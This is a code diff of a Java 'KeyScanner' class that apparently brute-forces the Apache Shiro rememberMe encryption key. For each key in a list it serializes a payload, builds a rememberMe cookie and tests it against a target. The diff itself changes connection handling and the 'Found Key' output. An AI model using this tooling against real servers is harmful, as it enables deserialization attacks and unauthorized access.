@@ -9,8 +9,6 @@ import java.util.Scanner;
 
 public class KeyScanner implements ShiroScanner {
 
-    private static final ShiroHttpConnection connection = new ShiroHttpConnection();
-
     private String base;
 
     @Override
@@ -22,17 +20,22 @@ public class KeyScanner implements ShiroScanner {
     public void scan() throws Exception {
         Scanner scanner = new Scanner(new File("src/main/resources/key"));
         String key = "";
-        boolean rightKey = true;
-        while (scanner.hasNextLine() && rightKey) {
+        boolean falseKey = true;
+        while (scanner.hasNextLine() && falseKey) {
+            ShiroHttpConnection connection = new ShiroHttpConnection(base);
             Util util = new Util();
             ScanKey scanKey = new ScanKey();
             key = scanner.nextLine();
             byte[] serialize = util.serialize(scanKey.getObjectPayload(null));
             String rememberMe = util.getRememberMe(serialize, key);
             System.out.println("[+] Test key: " + key);
-            rightKey = !connection.checkKey(base, rememberMe);
+            falseKey = connection.checkFalseKey(rememberMe);
         }
-        System.err.println("[*] Find Key: " + key);
+        if (!falseKey) {
+            System.err.println("[*] Found Key: " + key);
+        } else {
+            System.err.println("[*] No Key Found");
+        }
     }
 
     public static void main(String[] args) throws Exception {
